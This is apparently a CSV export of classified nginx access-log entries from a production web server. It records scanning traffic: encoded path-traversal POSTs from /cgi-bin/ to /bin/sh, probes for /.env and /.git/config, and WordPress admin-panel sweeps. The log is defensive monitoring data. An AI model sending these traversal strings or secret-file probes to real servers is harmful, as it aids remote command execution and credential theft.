Stream Name,Client IP,Attack Type,Method,Request Path,Status Code,Raw Log
_nginx_access_log_Analytics_PROD_Lapine,106.13.47.28,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"106.13.47.28 - - [15/Mar/2026:23:33:32 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/admin.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:40:53 +0000] ""GET /admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/admin.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:40:53 +0000] ""GET /admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/user/index.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:40:55 +0000] ""GET /wp-admin/user/index.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/user/index.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:40:55 +0000] ""GET /wp-admin/user/index.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/adminfuns.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:40:56 +0000] ""GET /adminfuns.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/adminfuns.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:40:56 +0000] ""GET /adminfuns.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Info Disclosure,GET,/info.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:40:59 +0000] ""GET /info.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Info Disclosure,GET,/info.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:40:59 +0000] ""GET /info.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Info Disclosure,GET,/cgi-bin/ HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:40:59 +0000] ""GET /cgi-bin/ HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Info Disclosure,GET,/cgi-bin/ HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:40:59 +0000] ""GET /cgi-bin/ HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/images/ HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:00 +0000] ""GET /wp-admin/images/ HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/images/ HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:00 +0000] ""GET /wp-admin/images/ HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-content/admin.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:01 +0000] ""GET /wp-content/admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-content/admin.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:01 +0000] ""GET /wp-content/admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/css/colors/ectoplasm/ HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:01 +0000] ""GET /wp-admin/css/colors/ectoplasm/ HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/css/colors/ectoplasm/ HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:01 +0000] ""GET /wp-admin/css/colors/ectoplasm/ HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-content/themes/admin.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:01 +0000] ""GET /wp-content/themes/admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-content/themes/admin.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:01 +0000] ""GET /wp-content/themes/admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/admin.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:03 +0000] ""GET /admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/admin.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:04 +0000] ""GET /admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/adminfuns.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:04 +0000] ""GET /adminfuns.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/adminfuns.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:04 +0000] ""GET /adminfuns.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-content/admin.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:04 +0000] ""GET /wp-content/admin.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-content/admin.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:04 +0000] ""GET /wp-content/admin.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Info Disclosure,GET,/info.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:05 +0000] ""GET /info.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Info Disclosure,GET,/info.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:05 +0000] ""GET /info.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/js/ HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/js/ HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/js/ HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/js/ HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/a.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/a.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/a.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/a.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/alfa.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/alfa.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/alfa.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/alfa.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/css/colors HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/css/colors HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/css/colors HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:08 +0000] ""GET /wp-admin/css/colors HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/js/widgets/ HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:09 +0000] ""GET /wp-admin/js/widgets/ HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/js/widgets/ HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:09 +0000] ""GET /wp-admin/js/widgets/ HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/network/index.php HTTP/1.1,301,"52.138.22.173 - - [15/Mar/2026:23:41:09 +0000] ""GET /wp-admin/network/index.php HTTP/1.1"" 301 162 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,52.138.22.173,Admin Panel Scan,GET,/wp-admin/network/index.php HTTP/1.1,404,"52.138.22.173 - - [15/Mar/2026:23:41:09 +0000] ""GET /wp-admin/network/index.php HTTP/1.1"" 404 1722 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,45.61.118.170,Environment File,GET,/.env HTTP/1.1,301,"45.61.118.170 - - [15/Mar/2026:23:52:10 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,104.238.37.130,Environment File,GET,/.env HTTP/1.1,301,"104.238.37.130 - - [16/Mar/2026:01:23:35 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,23.95.250.187,Environment File,GET,/.env HTTP/1.1,404,"23.95.250.187 - - [16/Mar/2026:03:25:15 +0000] ""GET /.env HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,101.36.107.228,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"101.36.107.228 - - [16/Mar/2026:03:59:47 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,101.36.107.228,Info Disclosure,POST,/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1,400,"101.36.107.228 - - [16/Mar/2026:03:59:48 +0000] ""POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,34.72.179.167,Git Exposure,GET,/.git/config HTTP/1.1,301,"34.72.179.167 - - [16/Mar/2026:04:08:02 +0000] ""GET /.git/config HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,34.72.179.167,Git Exposure,GET,/.git/config HTTP/2.0,404,"34.72.179.167 - - [16/Mar/2026:04:08:02 +0000] ""GET /.git/config HTTP/2.0"" 404 734 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,45.61.116.226,Environment File,GET,/.env HTTP/1.1,301,"45.61.116.226 - - [16/Mar/2026:04:25:40 +0000] ""GET /.env HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,195.178.110.159,Git Exposure,GET,/.git/config HTTP/1.1,404,"195.178.110.159 - - [16/Mar/2026:04:47:08 +0000] ""GET /.git/config HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,20.83.3.189,Info Disclosure,POST,/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1,400,"20.83.3.189 - - [16/Mar/2026:04:51:26 +0000] ""POST /cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,115.191.32.57,Info Disclosure,POST,/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,400,"115.191.32.57 - - [16/Mar/2026:05:28:03 +0000] ""POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1"" 400 150 ""-"" ""-"""
_nginx_access_log_Analytics_PROD_Lapine,20.70.152.4,Git Exposure,GET,/.git/config HTTP/1.1,301,"20.70.152.4 - - [16/Mar/2026:06:47:18 +0000] ""GET /.git/config HTTP/1.1"" 301 162 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
_nginx_access_log_Analytics_PROD_Lapine,20.70.152.4,Git Exposure,GET,/.git/config HTTP/1.1,404,"20.70.152.4 - - [16/Mar/2026:06:47:18 +0000] ""GET /.git/config HTTP/1.1"" 404 746 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"""
